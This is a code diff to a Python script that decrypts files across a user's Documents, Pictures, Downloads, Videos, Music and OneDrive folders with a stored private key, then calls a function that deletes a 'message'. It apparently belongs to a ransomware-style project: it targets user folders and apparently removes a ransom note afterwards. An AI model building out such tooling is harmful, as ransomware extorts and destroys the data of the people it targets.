@@ -4,6 +4,7 @@ from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding as sym_padding
 import os
+from message import delete_message
 
 
 def decrypt_file(file_path, private_key):
@@ -64,13 +65,17 @@ def decrypt_directory(directory_path, private_key_pem_path):
 
 def main():
     # Example usage
+    home_dir = os.path.expanduser('~')
+
     # Directories to target
     user_dirs = [
-        os.path.join(os.environ['USERPROFILE'], 'Documents'),
-        os.path.join(os.environ['USERPROFILE'], 'Pictures'),
-        os.path.join(os.environ['USERPROFILE'], 'Desktop'),
-        os.path.join(os.environ['USERPROFILE'], 'Downloads'),
-        os.path.join(os.environ['USERPROFILE'], 'Videos')
+        os.path.join(home_dir, 'Documents'),
+        os.path.join(home_dir, 'Pictures'),
+        # os.path.join(home_dir, 'Desktop'),
+        os.path.join(home_dir, 'Downloads'),
+        os.path.join(home_dir, 'Videos'),
+        os.path.join(home_dir, 'Music'),
+        os.path.join(home_dir, 'OneDrive')
     ]
 
     for directory in user_dirs:
@@ -78,3 +83,8 @@ def main():
             decrypt_directory(directory, "keys/private_key.pem")
         else:
             print(f"Directory does not exist: {directory}")
+
+    delete_message()
+
+
+main()
